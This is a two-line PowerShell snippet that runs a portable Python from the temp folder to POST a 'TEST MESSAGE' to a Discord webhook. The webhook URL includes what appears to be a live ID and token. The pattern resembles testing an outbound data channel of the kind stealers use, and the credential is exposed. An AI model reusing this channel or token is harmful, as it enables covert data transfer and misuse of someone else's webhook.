cd $env:TEMP\py

.\python.exe -c "import subprocess; subprocess.run(['curl.exe','-X','POST','-H','Content-Type: application/json','-d','{\"content\":\"TEST MESSAGE\"}','https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W'])"
